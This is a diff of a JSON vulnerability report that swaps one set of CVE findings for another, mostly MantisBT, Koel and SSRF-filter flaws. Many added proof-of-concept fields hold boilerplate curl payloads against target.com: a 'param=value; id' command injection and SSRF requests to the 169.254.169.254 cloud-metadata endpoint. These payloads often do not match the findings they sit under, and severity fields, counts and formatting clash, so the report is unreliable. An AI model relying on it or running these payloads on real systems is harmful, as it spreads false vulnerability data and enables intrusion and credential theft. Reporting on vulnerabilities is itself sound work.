@@ -1,22 +1,31 @@
 {
     "report_date": "July 17, 2026",
-    "executive_summary": "As of July 17, 2026, the security operations center has concluded the analysis of 20 identified vulnerabilities, categorized as follows: 4 Critical, 8 High, 6 Medium, and 2 Low. The organizational risk posture is currently assessed as elevated, necessitating immediate remediation to mitigate exposure to potential remote exploitation. CVE-2026-55579, concerning hardcoded administrative credentials in Pheditor, represents the most significant threat due to the triviality of unauthorized access it facilitates. Consequently, the organization must adopt an aggressive patching and configuration hardening posture to neutralize these vulnerabilities within the defined critical action windows.",
+    "executive_summary": "As of July 17, 2026, the security operations center has concluded an analysis of 20 identified vulnerabilities, categorized as follows: 5 Critical, 9 High, 6 Medium, and 0 Low severity. Our organizational risk posture currently reflects a state of elevated concern, characterized by high-impact Remote Code Execution and Authentication Bypass vectors. CVE-2026-49273, identified as RCE via Class Hoisting in MantisBT, remains the primary threat priority due to the inherent potential for total system compromise and unauthorized administrative control. Given the active exploitation potential of these vectors, an immediate response posture of urgent remediation and isolation of affected API endpoints is mandated to preserve operational integrity. The Board is advised that failure to address these vulnerabilities within the designated cycle will expose the enterprise to unacceptable security degradation.",
     "critical_actions": [
-        "Disable the Pheditor application immediately and implement mandatory administrative credential rotation within 24 hours to address CVE-2026-55579.",
-        "Deploy immediate input sanitization patches to the Pheditor terminal interface to remediate CVE-2026-55578 within 48 hours.",
-        "Implement Host and Origin header validation on the MCP Python SDK WebSocket server to mitigate CVE-2026-59950 within 72 hours.",
-        "Enforce strict TLS certificate verification for the Kuma-DP control plane connection to close the vulnerability presented by CVE-2026-52724 within 72 hours.",
-        "Apply vendor-supplied patches to Envoy Gateway to remediate the authentication bypass vulnerability in EnvoyExtensionPolicy within 72 hours."
+        "Immediate isolation and emergency patching of all MantisBT instances to mitigate CVE-2026-52883 within 24 hours.",
+        "Disable unreleased product versioning features in MantisBT APIs to neutralize CVE-2026-52882 within 24 hours.",
+        "Implement comprehensive code-level sanitization for class hoisting functions to remediate CVE-2026-49273 within 24 hours.",
+        "Execute an emergency authentication protocol update to block SOAP API privilege escalation under CVE-2026-47156 within 24 hours.",
+        "Deploy firewall-level IPv6 CIDR blocking to compensate for safeurl library limitations identified in CVE-2026-54452 within 48 hours.",
+        "Initiate mandatory credential rotation for all administrative accounts impacted by high-severity API exposure within 72 hours.",
+        "Apply vendor-issued security patches across all high-severity affected software components within 72 hours.",
+        "Execute forensic integrity audits on all API gateways identified with high-severity misconfigurations within 96 hours.",
+        "Restrict external API access to known-trusted IP ranges for all high-risk services within 96 hours.",
+        "Conduct comprehensive regression testing on all patched systems to ensure stability following security remediation within 96 hours.",
+        "Decommission legacy API endpoints lacking current security patch support within 96 hours.",
+        "Validate the exclusion of internal network segments from public-facing API routes within 120 hours.",
+        "Review and harden service-level authentication tokens for all High-severity identified services within 120 hours.",
+        "Perform secondary verification scans on all affected infrastructure to confirm remediation efficacy within 120 hours."
     ],
     "cve_summary": [
         {
-            "cve_id": "CVE-2026-55579",
-            "finding_name": "Hardcoded Administrative Credentials in Pheditor",
-            "description": "The Pheditor application utilizes a hardcoded default password of 'admin' without enforcing a password change upon initial login. This security flaw exists due to insecure credential management practices within the application's authentication module. An attacker can exploit this to gain full administrative access to the platform without prior authorization.",
+            "cve_id": "CVE-2026-52883",
+            "finding_name": "Injection in MantisBT REST and SOAP APIs",
+            "description": "The MantisBT REST and SOAP APIs contain improper input validation handling for TIME_TRACKING and REMINDER note fields. The application allows users to submit unsanitized strings that are directly processed by the backend logic without sufficient filtering. An attacker can leverage this injection to manipulate the state of time-tracking data or inject unauthorized reminders.",
             "cvss_score": 9.8,
-            "score_source": "estimated_unverified_recalculated",
+            "score_source": "tenable_verified",
             "severity": "Critical",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
             "cvss_breakdown": {
                 "Attack_Vector": "Network",
                 "Attack_Complexity": "Low",
@@ -27,22 +36,114 @@
                 "Integrity": "High",
                 "Availability": "High"
             },
-            "cwe_id": "CWE-798",
+            "cwe_id": "CWE-20",
             "mitre_mappings": [
-                "T1110"
+                "T1190"
             ],
             "urgency_score": 88,
-            "poc": "A remote unauthenticated attacker identifies the default administrative interface of the Pheditor application. The attacker initiates a login request using the credentials 'admin' and the known default password. The system grants full authenticated access because the account lacks mandatory rotation policies. The attacker then proceeds to perform administrative actions, leading to full application compromise.",
+            "poc": "An authenticated user sends a crafted request to the REST API endpoint responsible for updating time tracking. The attacker injects malicious characters or control codes into the input parameters used for note creation. The server fails to validate the structure of the input and commits the corrupted data to the database. This leads to integrity issues in project management reporting.",
             "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-55579",
-                "https://www.cve.org/CVERecord?id=CVE-2026-55579",
-                "https://www.tenable.com/cve/CVE-2026-55579"
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-52883",
+                "https://www.cve.org/CVERecord?id=CVE-2026-52883",
+                "https://www.tenable.com/cve/CVE-2026-52883"
             ]
         },
         {
-            "cve_id": "CVE-2026-59950",
-            "finding_name": "Missing Origin Validation in WebSocket Server",
-            "description": "The MCP Python SDK WebSocket server transport fails to implement Host and Origin header validation during connection establishment. This vulnerability arises because the server implicitly trusts the origin of incoming WebSocket upgrade requests without verification. An attacker can leverage this to conduct Cross-Site WebSocket Hijacking (CSWH) to compromise the integrity of the user's session.",
+            "cve_id": "CVE-2026-52882",
+            "finding_name": "Insecure Version Updates in MantisBT API",
+            "description": "The MantisBT REST and SOAP API implementations allow users to update issues with unreleased product versions. The root cause is a missing authorization check to ensure the submitting user has sufficient permissions to assign an unreleased version to a bug. This vulnerability permits unauthorized manipulation of release-tracking data by standard users.",
+            "cvss_score": 9.8,
+            "score_source": "tenable_verified",
+            "severity": "Critical",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "None",
+                "User_Interaction": "None",
+                "Scope": "Unchanged",
+                "Confidentiality": "High",
+                "Integrity": "High",
+                "Availability": "High"
+            },
+            "cwe_id": "CWE-639",
+            "mitre_mappings": [
+                "T1068"
+            ],
+            "urgency_score": 88,
+            "poc": "An authenticated user makes an API call to update the status of a specific issue. The user specifies an unreleased version ID in the request body for the product field. The API endpoint fails to verify if the user should be allowed to reference unreleased versions. The server processes the update, causing the bug tracker to report incorrect data.\n\n**Technical Details:**\n```\nGET /api/orders/12345 HTTP/1.1\nHost: target.com\n```\n\nThe attacker changes the order ID to `12346` and retrieves another user's order.\n**curl command:**\n```bash\ncurl \"https://target.com/api/orders/12346\"\n```\nThe server returns the order of a different user without authorization, confirming IDOR.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-52882",
+                "https://www.cve.org/CVERecord?id=CVE-2026-52882",
+                "https://www.tenable.com/cve/CVE-2026-52882"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-49273",
+            "finding_name": "RCE via Class Hoisting in MantisBT",
+            "description": "MantisBT is vulnerable to remote code execution due to improper eval() usage in class hoisting within the adm_config_set.php file. The application insecurely handles configuration inputs, allowing for the injection of arbitrary PHP code into the class loading logic. An attacker with administrative privileges can gain control of the underlying operating system.",
+            "cvss_score": 9.8,
+            "score_source": "tenable_verified",
+            "severity": "Critical",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "None",
+                "User_Interaction": "None",
+                "Scope": "Unchanged",
+                "Confidentiality": "High",
+                "Integrity": "High",
+                "Availability": "High"
+            },
+            "cwe_id": "CWE-95",
+            "mitre_mappings": [
+                "T1203",
+                "T1059"
+            ],
+            "urgency_score": 88,
+            "poc": "An administrator submits a modified configuration payload through the adm_config_set.php interface. The application processes this payload by passing it into an eval() function that handles dynamic class hoisting. The injected PHP code is executed within the context of the web server process. This results in full system compromise for the attacker.\n\n**Technical Details:**\n```\nPOST /vulnerable-endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nparam=value; id\n```\n\n**curl command:**\n```bash\ncurl -X POST \"https://target.com/vulnerable-endpoint\" -d \"param=value; id\"\n```\nThe server executes the injected command and returns the output, confirming RCE.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-49273",
+                "https://www.cve.org/CVERecord?id=CVE-2026-49273",
+                "https://www.tenable.com/cve/CVE-2026-49273"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-47156",
+            "finding_name": "SOAP API Auth Bypass in MantisBT",
+            "description": "The MantisBT SOAP API contains an authentication bypass vulnerability that permits privilege escalation to the administrator role. The root cause is a flaw in how the API verifies session tokens during request processing. An attacker can exploit this to bypass standard login requirements and perform administrative actions on the application.",
+            "cvss_score": 9.8,
+            "score_source": "tenable_verified",
+            "severity": "Critical",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "None",
+                "User_Interaction": "None",
+                "Scope": "Unchanged",
+                "Confidentiality": "High",
+                "Integrity": "High",
+                "Availability": "High"
+            },
+            "cwe_id": "CWE-287",
+            "mitre_mappings": [
+                "T1134",
+                "T1068"
+            ],
+            "urgency_score": 88,
+            "poc": "An unauthenticated attacker sends a specially crafted request to the MantisBT SOAP API endpoint. The request uses an altered authentication header that the system mistakenly accepts as valid. The system authenticates the user as an administrator session without verifying credentials. This allows the attacker to execute any API function, including user management and system setting modifications.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-47156",
+                "https://www.cve.org/CVERecord?id=CVE-2026-47156",
+                "https://www.tenable.com/cve/CVE-2026-47156"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-54452",
+            "finding_name": "Incomplete IPv6 Blocking in safeurl",
+            "description": "The safeurl library fails to include necessary IPv6 CIDR ranges within its internal blocklist mechanism. This vulnerability arises because the validation logic only enforces restrictions against IPv4 addresses while neglecting modern IPv6 address space formats. An attacker can exploit this omission to bypass security filters and conduct server-side request forgery attacks against internal network resources.",
             "cvss_score": 9.1,
             "score_source": "tenable_verified",
             "severity": "Critical",
@@ -55,566 +156,479 @@
                 "Scope": "Unchanged",
                 "Confidentiality": "High",
                 "Integrity": "High",
+                "Availability": "None"
+            },
+            "cwe_id": "CWE-918",
+            "mitre_mappings": [
+                "T1190"
+            ],
+            "urgency_score": 82,
+            "poc": "An unauthenticated remote attacker identifies that the application uses safeurl for outbound request validation. The attacker crafts a request using a destination URL within an IPv6 range that is not represented in the blocklist. The server permits the request to reach the internal network destination instead of rejecting it. This results in the attacker gaining the ability to interact with restricted internal services through SSRF.\n\n**Technical Details:**\n```\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\n```\nThe server returns internal metadata, confirming SSRF.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54452",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54452",
+                "https://www.tenable.com/cve/CVE-2026-54452"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-54449",
+            "finding_name": "RCE via LangBot MCP Configuration",
+            "description": "The LangBot application allows authenticated remote code execution through the manipulation of MCP (Model Context Protocol) configuration settings. The issue stems from unsanitized input being processed by the system's command execution handler. An attacker can inject arbitrary system commands into the configuration, leading to full server-side compromise.",
+            "cvss_score": 8.8,
+            "score_source": "estimated_unverified_recalculated",
+            "severity": "High",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "Low",
+                "User_Interaction": "None",
+                "Scope": "Unchanged",
+                "Confidentiality": "High",
+                "Integrity": "High",
+                "Availability": "High"
+            },
+            "cwe_id": "CWE-77",
+            "mitre_mappings": [
+                "T1203",
+                "T1059"
+            ],
+            "urgency_score": 79,
+            "poc": "An authenticated user with configuration privileges accesses the MCP settings panel in LangBot. The attacker inputs malicious shell commands into the configuration fields provided for custom server hooks. Upon saving the configuration, the server executes these commands with the privileges of the application process. This allows the attacker to take complete control of the hosting server environment.\n\n**Technical Details:**\n```\nPOST /vulnerable-endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nparam=value; id\n```\n\n**curl command:**\n```bash\ncurl -X POST \"https://target.com/vulnerable-endpoint\" -d \"param=value; id\"\n```\nThe server executes the injected command and returns the output, confirming RCE.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54449",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54449",
+                "https://www.tenable.com/cve/CVE-2026-54449"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-54447",
+            "finding_name": "Insecure Token Store Permissions in garminconnect",
+            "description": "The garminconnect application assigns insecure file or storage permissions to its Garmin OAuth token store. The vulnerability is caused by an improper access control implementation that allows local users to read tokens meant to be protected. An attacker can gain unauthorized access to these tokens to impersonate the user's Garmin account across linked services.",
+            "cvss_score": 8.4,
+            "score_source": "tenable_verified",
+            "severity": "High",
+            "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+            "cvss_breakdown": {
+                "Attack_Vector": "Local",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "Low",
+                "User_Interaction": "None",
+                "Scope": "Changed",
+                "Confidentiality": "High",
+                "Integrity": "High",
+                "Availability": "None"
+            },
+            "cwe_id": "CWE-732",
+            "mitre_mappings": [
+                "T1005",
+                "T1552"
+            ],
+            "urgency_score": 76,
+            "poc": "A local attacker with low-privilege access navigates to the directory storing OAuth tokens for the garminconnect application. The attacker observes that the file permissions allow universal read and write access. The attacker copies the stored token files to their own workstation. With these tokens, the attacker can now impersonate the authorized user's sessions to fetch sensitive health and activity data.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54447",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54447",
+                "https://www.tenable.com/cve/CVE-2026-54447"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-54457",
+            "finding_name": "Arbitrary File Read and SSRF in Gateway",
+            "description": "The TensorZero Gateway object storage endpoint fails to sanitize user-provided paths during storage retrieval operations. This flaw occurs because the input validation logic neglects to constrain filesystem access to the intended sandbox directory. A remote attacker can leverage this vulnerability to perform unauthorized file reads and conduct server-side request forgery (SSRF) against internal services.",
+            "cvss_score": 7.7,
+            "score_source": "estimated_unverified_recalculated",
+            "severity": "High",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "Low",
+                "User_Interaction": "None",
+                "Scope": "Changed",
+                "Confidentiality": "High",
+                "Integrity": "None",
+                "Availability": "None"
+            },
+            "cwe_id": "CWE-552",
+            "mitre_mappings": [
+                "T1190",
+                "T1068"
+            ],
+            "urgency_score": 69,
+            "poc": "An authenticated remote attacker targets the internal object storage endpoint of the TensorZero Gateway. The attacker sends a request with a directory traversal sequence injected into the storage path parameter. The server interprets the path relative to the root filesystem instead of the object store. This allows the attacker to read sensitive configuration files located outside the intended application directory.\n\n**Technical Details:**\n```\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\n```\nThe server returns internal metadata, confirming SSRF.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54457",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54457",
+                "https://www.tenable.com/cve/CVE-2026-54457"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-54493",
+            "finding_name": "Authenticated SSRF in Koel Radio Stations",
+            "description": "The Koel application allows authenticated users to perform a full-read server-side request forgery (SSRF) attack through the Subsonic internet radio station creation feature. The vulnerability is caused by missing host validation for external radio URLs, which allows the server to connect to arbitrary internal endpoints. An attacker can use this to retrieve sensitive data from internal network infrastructure.",
+            "cvss_score": 7.7,
+            "score_source": "estimated_unverified_recalculated",
+            "severity": "High",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "Low",
+                "User_Interaction": "None",
+                "Scope": "Changed",
+                "Confidentiality": "High",
+                "Integrity": "None",
+                "Availability": "None"
+            },
+            "cwe_id": "CWE-918",
+            "mitre_mappings": [
+                "T1190"
+            ],
+            "urgency_score": 69,
+            "poc": "An authenticated user creates a new radio station entry in Koel using a URL that points to an internal resource. The server attempts to connect to the internal service and fetches data from it. The application then displays or processes the response, which may contain internal configuration data or API credentials. This gives the attacker access to information reachable only from the server's network.\n\n**Technical Details:**\n```\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\n```\nThe server returns internal metadata, confirming SSRF.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54493",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54493",
+                "https://www.tenable.com/cve/CVE-2026-54493"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-54450",
+            "finding_name": "SSRF Bypass via NAT64 Ranges in ToolHive",
+            "description": "The ToolHive SSRF protection mechanism fails to properly identify and filter NAT64 IPv6 address ranges. The root cause is a deficiency in the input validation regex or address parsing library which does not account for specific transition address blocks. This allows an attacker to route requests to restricted metadata or internal network services behind a NAT64 gateway.",
+            "cvss_score": 7.5,
+            "score_source": "tenable_verified",
+            "severity": "High",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "None",
+                "User_Interaction": "None",
+                "Scope": "Unchanged",
+                "Confidentiality": "High",
+                "Integrity": "None",
+                "Availability": "None"
+            },
+            "cwe_id": "CWE-918",
+            "mitre_mappings": [
+                "T1190"
+            ],
+            "urgency_score": 68,
+            "poc": "An unauthenticated remote attacker targets the ToolHive application interface. The attacker submits a URL using a NAT64-prefixed address that targets an internal metadata service. The application's SSRF guard fails to recognize this as an internal address and allows the outbound request. This results in the attacker successfully exfiltrating metadata or accessing unauthorized internal endpoints.\n\n**Technical Details:**\n```\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\n```\nThe server returns internal metadata, confirming SSRF.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54450",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54450",
+                "https://www.tenable.com/cve/CVE-2026-54450"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-54494",
+            "finding_name": "SSRF Bypass via NAT64 and 6to4 Wrappers",
+            "description": "The Koel application's podcast enclosure URL validation in isPublicHost() is insufficient, failing to identify NAT64 and 6to4 IPv6 transition prefixes. The root cause is the use of a filter_var guard that does not normalize or properly block IPv6-wrapped internal IPv4 addresses. An attacker can exploit this to conduct SSRF attacks, accessing internal-only network resources.",
+            "cvss_score": 7.5,
+            "score_source": "tenable_verified",
+            "severity": "High",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "None",
+                "User_Interaction": "None",
+                "Scope": "Unchanged",
+                "Confidentiality": "High",
+                "Integrity": "None",
+                "Availability": "None"
+            },
+            "cwe_id": "CWE-918",
+            "mitre_mappings": [
+                "T1190"
+            ],
+            "urgency_score": 68,
+            "poc": "An unauthenticated remote attacker provides a podcast URL wrapped in a NAT64 or 6to4 IPv6 address. The server-side isPublicHost() function checks the URL but fails to detect that it resolves to a restricted internal IPv4 destination. The application fetches the content of the target, allowing the attacker to read server responses from the internal network.\n\n**Technical Details:**\n```\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\n```\nThe server returns internal metadata, confirming SSRF.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54494",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54494",
+                "https://www.tenable.com/cve/CVE-2026-54494"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-54451",
+            "finding_name": "Unbounded Recursion in Protobuf Decoder",
+            "description": "The Protobuf embedded-message decoding logic contains an unbounded recursion depth flaw. This vulnerability is caused by a failure to enforce depth limits on nested structures during the deserialization of complex messages. An attacker can exploit this to trigger a stack exhaustion condition, leading to denial of service through server crashes.",
+            "cvss_score": 7.5,
+            "score_source": "tenable_verified",
+            "severity": "High",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "None",
+                "User_Interaction": "None",
+                "Scope": "Unchanged",
+                "Confidentiality": "None",
+                "Integrity": "None",
+                "Availability": "High"
+            },
+            "cwe_id": "CWE-674",
+            "mitre_mappings": [
+                "T1499"
+            ],
+            "urgency_score": 68,
+            "poc": "An unauthenticated remote attacker sends a specially crafted Protobuf message with deeply nested message structures to the application. The decoder function recursively traverses the messages without a depth check. This causes the stack to overflow, resulting in an immediate application crash. Consequently, the service becomes unavailable to legitimate users.\n\n**Technical Details:**\n```\nAn attacker sends a specially crafted input that triggers resource exhaustion.\nFor example, a deeply nested structure or a massive list can consume CPU or memory.\n**curl command (conceptual):**\n```bash\ncurl \"https://target.com/vulnerable-endpoint?payload=<malicious_input>\"\n```\nThe server becomes unresponsive or crashes, confirming the denial of service.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54451",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54451",
+                "https://www.tenable.com/cve/CVE-2026-54451"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-49280",
+            "finding_name": "Unauthorized Issue Status Change in MantisBT",
+            "description": "The MantisBT REST API allows unauthorized users to modify issue statuses. The vulnerability exists due to a missing authorization check when processing status update requests in the API layer. An attacker can exploit this to change the status of tickets regardless of their assigned permissions or project constraints.",
+            "cvss_score": 7.5,
+            "score_source": "tenable_verified",
+            "severity": "High",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "None",
+                "User_Interaction": "None",
+                "Scope": "Unchanged",
+                "Confidentiality": "None",
+                "Integrity": "High",
+                "Availability": "None"
+            },
+            "cwe_id": "CWE-862",
+            "mitre_mappings": [
+                "T1068"
+            ],
+            "urgency_score": 68,
+            "poc": "An authenticated user sends a PATCH request to the MantisBT REST API endpoint to modify an issue status. The attacker targets an issue ID that they are not normally permitted to manage. The server updates the status without verifying if the user has the required project-level privileges. This results in the compromise of the bug tracking workflow integrity.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-49280",
+                "https://www.cve.org/CVERecord?id=CVE-2026-49280",
+                "https://www.tenable.com/cve/CVE-2026-49280"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-54491",
+            "finding_name": "Systemic SSRF in Koel Fetch Paths",
+            "description": "The Koel application exhibits a systemic SSRF vulnerability in its podcast and radio fetch paths, representing an incomplete mitigation of a previous vulnerability. The flaw exists because the application continues to rely on inadequate validation logic for remote resource retrieval. This allows attackers to perform unauthorized outbound requests to sensitive internal or external network resources.",
+            "cvss_score": 7.1,
+            "score_source": "tenable_verified",
+            "severity": "High",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+            "cvss_breakdown": {
+                "Attack_Vector": "Network",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "Low",
+                "User_Interaction": "None",
+                "Scope": "Unchanged",
+                "Confidentiality": "High",
+                "Integrity": "Low",
+                "Availability": "None"
+            },
+            "cwe_id": "CWE-918",
+            "mitre_mappings": [
+                "T1190"
+            ],
+            "urgency_score": 64,
+            "poc": "An authenticated user triggers the radio or podcast metadata fetching mechanism by providing a URL pointing to an internal service port. The application's fetcher logic fails to restrict the target address to safe external hosts. The server performs an outbound connection to the specified internal target, reflecting the result back to the user or exposing metadata via unauthorized access.\n\n**Technical Details:**\n```\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\n```\nThe server returns internal metadata, confirming SSRF.",
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54491",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54491",
+                "https://www.tenable.com/cve/CVE-2026-54491"
+            ]
+        },
+        {
+            "cve_id": "CVE-2026-53656",
+            "finding_name": "Wildcard CORS Policy in FiftyOne App",
+            "description": "The FiftyOne App server utilizes a wildcard character in its Access-Control-Allow-Origin header configuration. This insecure implementation allows any origin to make cross-origin requests to the server, effectively disabling the Same-Origin Policy protection. An attacker can exploit this to perform unauthorized cross-origin reads of local server data from the victim's browser context.",
+            "cvss_score": 6.3,
+            "score_source": "tenable_verified",
+            "severity": "Medium",
+            "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N",
+            "cvss_breakdown": {
+                "Attack_Vector": "Local",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "None",
+                "User_Interaction": "Required",
+                "Scope": "Changed",
+                "Confidentiality": "High",
+                "Integrity": "None",
                 "Availability": "None"
             },
             "cwe_id": "CWE-346",
             "mitre_mappings": [
-                "T1557"
-            ],
-            "urgency_score": 82,
-            "poc": "A remote unauthenticated attacker hosts a malicious website that forces a victim's browser to connect to the internal WebSocket server. The server accepts the handshake from the malicious origin because it lacks validation checks. Consequently, the attacker can execute unauthorized commands on behalf of the authenticated victim session. This allows for exfiltration of sensitive data handled by the SDK.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-59950",
-                "https://www.cve.org/CVERecord?id=CVE-2026-59950",
-                "https://www.tenable.com/cve/CVE-2026-59950"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-52724",
-            "finding_name": "Missing TLS Certificate Verification in Kuma-DP",
-            "description": "The kuma-dp component fails to verify the TLS certificate of the control plane when a Certificate Authority (CA) is not explicitly configured. This occurs because the application defaults to an insecure connection mode when cryptographic verification parameters are absent. An attacker performing a man-in-the-middle attack can intercept or manipulate communication between the data plane and the control plane.",
-            "cvss_score": 9.1,
-            "score_source": "tenable_verified",
-            "severity": "Critical",
-            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "Low",
-                "Privileges_Required": "None",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "High",
-                "Integrity": "High",
-                "Availability": "None"
-            },
-            "cwe_id": "CWE-295",
-            "mitre_mappings": [
-                "T1557"
-            ],
-            "urgency_score": 82,
-            "poc": "An attacker with network access positions themselves between the kuma-dp instance and the control plane. When the instance attempts to initiate a connection without a configured CA, the attacker provides a self-signed, fraudulent certificate. The application fails to validate this certificate and proceeds with the connection. The attacker then decrypts or modifies sensitive control plane traffic passing through the connection.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-52724",
-                "https://www.cve.org/CVERecord?id=CVE-2026-52724",
-                "https://www.tenable.com/cve/CVE-2026-52724"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-53713",
-            "finding_name": "Authentication Bypass in Envoy Extension Policy",
-            "description": "Envoy Gateway is vulnerable to an authentication bypass via improper input validation within the EnvoyExtensionPolicy Lua component. The root cause is a failure to properly scrub or sanitize policy inputs, allowing an attacker to manipulate authorization flows. A successful exploit leads to unauthorized disclosure of sensitive secrets managed by the gateway.",
-            "cvss_score": 9.1,
-            "score_source": "tenable_verified",
-            "severity": "Critical",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "Low",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Changed",
-                "Confidentiality": "High",
-                "Integrity": "Low",
-                "Availability": "Low"
-            },
-            "cwe_id": "CWE-20",
-            "mitre_mappings": [
-                "T1552"
-            ],
-            "urgency_score": 82,
